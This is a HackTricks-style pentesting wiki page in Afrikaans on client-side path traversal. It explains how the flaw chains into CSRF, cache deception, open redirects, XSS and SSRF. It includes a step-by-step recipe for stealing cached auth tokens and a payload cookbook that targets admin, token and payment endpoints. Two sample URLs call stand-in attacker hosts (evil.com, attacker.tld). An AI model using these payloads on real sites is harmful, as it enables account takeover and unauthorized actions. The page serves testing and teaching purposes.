# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## Basiese Inligting

A client side path traversal vind plaas wanneer jy die **pad van ’n URL kan manipuleer** wat na ’n gebruiker gestuur gaan word om op ’n wettige manier te besoek of wat ’n gebruiker op een of ander manier gedwing sal word om te besoek, byvoorbeeld via JS of CSS. CSPT is ook bekend as **On-Site Request Forgery (OSRF)** omdat dit jou toelaat om die slagoffer se blaaier te dwing om ewekansige paadjies op dieselfde oorsprong met hul cookies, JWTs, of mTLS certificates te tref.

Tipiese bronne (data wat jy beheer):

- Roete-parameters wat gekonkateneer word in `fetch()` of XHR-paaie (React Router, Next.js dynamic routes, Vue router params, Angular `ActivatedRoute`).
- Gestoorde waardes (profile slugs, document IDs) wat in paadjies geïnterpoleer word binne background jobs, service workers, of WebSocket URLs.
- UI-gadgets (download/export buttons, image galleries) wat deur gebruiker beheerde fragmente of file extensions aan API-endpunte heg voordat die versoek gestuur word.

Tipiese sinks (waar die traversering beland):

- Frontend API wrappers wat `/api/` of `/proxy/` voorafgaan en auth headers outomaties hergebruik.
- `history.pushState` / `router.navigate` helpers wat later tydens hydration URL's herkonstrueer.
- `<link>`/`<style>`/`@import` stellings wat gegenereer word deur CMS content of feature-flag payloads.

### Algemene impakte & kettings

- **CSPT ➜ CSRF/OSRF**: kaap geauthentiseerde `POST/PUT/DELETE` oproepe deur die beoogde hulpbronpad te ontvlug en dan weer sensitiewe endpunte te betree (password reset, payment approval, access revocation). Kombineer dit met die [CSRF](csrf-cross-site-request-forgery.md) checklist om op te skerp.
- **CSPT ➜ cache deception / poisoning**: dien attacker-controlled JSON vanaf public CDN keys en speel dit terug unauthenticated. Sien [Cache Poisoning and Cache Deception](cache-deception/README.md).
- **CSPT ➜ Open Redirect ➜ XSS/SSRF**: die traversering beland by ’n open redirect endpoint, wat dan terugkaats na attacker infrastruktuur wat kwaadwillige JS of SSRF payloads bedien. Ketting dit met [Open Redirect](open-redirect.md) misbruik.

### Voorbeeldbevindinge

- In [**this writeup**](https://erasec.be/blog/client-side-path-manipulation/), dit was moontlik om die **invite URL te verander** sodat dit uiteindelik ’n kaart sou **kanselleer**.
- In [**this writeup**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html), dit was moontlik om ’n **client side path traversal via CSS** (dit was moontlik om die pad te verander waar ’n CSS-bron van gelaai is) te kombineer met ’n **open redirect** om die CSS-bron vanaf ’n **attacker controlled domain** te laai.
- In [**this writeup**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html), dit is moontlik om ’n tegniek te sien oor hoe om CSPT te misbruik **om ’n CSRF-aanval uit te voer**. Dit word gedoen deur **alle data te monitor** wat ’n attacker kan beheer (URL path, parameters, fragment, data geïnjecteer in die DB...) **en die sinks** waarheen hierdie data eindig (versoeke wat uitgevoer word).
- Check [**this browser extension**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/) om dit te monitor.
- Check hierdie [**CSPT playground**](https://github.com/doyensec/CSPTPlayground) om die tegniek te probeer.
- Check [**this tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html) oor hoe om die browser extension in die playground te gebruik.

## CSPT-assisted web cache poisoning/deception

CSPT kan gekoppel word aan extension-based CDN caching om sensitiewe JSON wat deur geauthentiseerde API-oproepe geleaked is, te exfiltrate:

- ’n Frontend konkateer gebruikerkontrole-invoer in ’n API-pad en heg authentication headers in fetch/XHR.
- Deur dot-segments (../) in te voeg kan jy die geauthentiseerde aanvraag retarget na ’n ander endpoint op dieselfde oorsprong.
- As daardie endpoint (of ’n padvariant met ’n staties-lykende suffix soos .css) deur die CDN gecache word sonder vary op auth headers, kan die slagoffer se geauthentiseerde response onder ’n publieke cache key gestoor word en deur enigiemand teruggevra word.

Vinnige resep:

1) Vind SPA-kode wat API-URL's bou vanaf pad-parameters terwyl dit auth headers stuur.
2) Identifiseer sensitiewe endpunte en toets statiese suffixe (.css, .js, .jpg, .json) om te sien of die CDN omskakel na Cache-Control: public/max-age en X-Cache: Hit terwyl dit JSON terugstuur.
3) Lok die slagoffer na ’n URL wat traversal in die SPA-parameter inject sodat die geauthentiseerde fetch die cachebare padvariant tref (byvoorbeeld, ../../../v1/token.css).
4) Lees dieselfde URL anoniem terug om die gecachte geheim te bekom (token → ATO).

Sien besonderhede en mitigasies op die Cache Deception bladsy: [Cache Poisoning and Cache Deception](cache-deception/README.md).

## Jagwerkvloeistroom & gereedskap

### Passiewe ontdekking met intercepting proxies

- **Korreleer bronne/sinks outomaties**: die [CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) ontleed jou proxy history, groepeer parameters wat later binne ander versoeke se paadjies gereflekteer word, en kan proof-of-concept URLs met canary tokens herbou om uitbuitbare traversals te bevestig. Na die JAR gelaai is, stel die `Source Scope` op client parameters (bv., `id`, `slug`) en die `Sink Methods` op `GET, POST, DELETE` sodat die extension gevaarlike request builders uitlig. Jy kan alle verdagte bronne met ’n ingebedde canary exporteer om dit in bulk te valideer.
- **Kyk vir double-URL-decoding**: terwyl jy blaai met Burp of ZAP, kyk uit vir `/api/%252e%252e/` patrone wat deur die frontend genormaliseer word voordat dit die netwerk tref—hierdie verskyn gewoonlik as base64-encoded JSON bodies wat route state verwys en is maklik om oor te sien sonder ’n geoutomatiseerde skandeerder.

### Instrumenteer SPA sinks handmatig

Om ’n kort snippet in DevTools te plaas help om verborge traversals te openbaar terwyl jy met die UI interakteer:
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- Voeg soortgelyke wrappers by rondom `XMLHttpRequest.prototype.open`, `history.pushState`, en framework-spesifieke routers (bv. `next/router`). Deur te kyk of `init.credentials === "include"` beperk jy vinnig die versoeke wat sessiekoekies dra.
- As die app routing-hints in IndexedDB/localStorage stoor, wysig daardie inskrywings met traversal payloads en herlaai — die gemuteerde staat word dikwels voor hydrasie weer in versoeke geïnjekteer.

### Lab en payload-oefening

- Spin up the CSPT Playground via `docker compose up` en oefen die ketting traversal ➜ CSRF ➜ stored XSS flows sonder om die target te raak. Reproduseer die target se router-struktuur lokaal om dit makliker te maak om deelbare PoCs te bou.
- Hê 'n scratchpad van suksesvolle dot-segment variations (`..;/`, `%2e%2e/`, `%2e./%2e/`, UTF-8 homoglyphs) en suffix tricks (`.css`, `.json`, `;` matrix params) wat jy tydens recon waargeneem het sodat jy dit vinnig kan herhaal as 'n nuwe sink verskyn.

## Onlangse gevallestudies (2025)

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – 'n traversal gadget binne `/public/plugins/` het aanvallers toegelaat om `../../` in die plugin asset loader te smokkel, dit aan Grafana’s open redirect te koppel, en slagoffers te dwing om aanvallers-geregte plugin-bundels te laai. Wanneer anonymous dashboards aangeskakel was, het 'n gemanierde URL soos `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js` daartoe gelei dat die blaaier remote JavaScript uitgevoer het; as die Image Renderer plugin geïnstalleer was, kon dieselfde primitif in SSRF omskep word deur rendering-versoeke na interne hosts te herlei. Toets altyd plugin asset paths, anonymous dashboards, en renderer endpoints saam, want 'n enkele traversal gee jou dikwels beide XSS- en SSRF-hoeke.

## Payload kookboek

| Doel | Payload pattern | Aantekeninge |
| --- | --- | --- |
| Hit sibling API under same origin | `?doc=../../v1/admin/users` | Werk wanneer routers eenvoudig `/${doc}` konkateer. Voeg `.json` by as CDN slegs staties-lykende assets cache. |
| Force SPA to follow open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | Combine with trusted redirectors listed in target’s codebase. Chain with [Open Redirect](open-redirect.md). |
| Abuse extension-based CDN cache | `?file=../../v1/token.css` | CDN mag `.css` as staties beskou en secrets wat as JSON teruggestuur word cache. |
| CSRF via verb change | `?action=../../payments/approve/.json&_method=POST` | Sommige routers aanvaar `_method` overrides; koppel met traversal om destruktiewe endpoints te her-teiken. |

## Verwysings

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
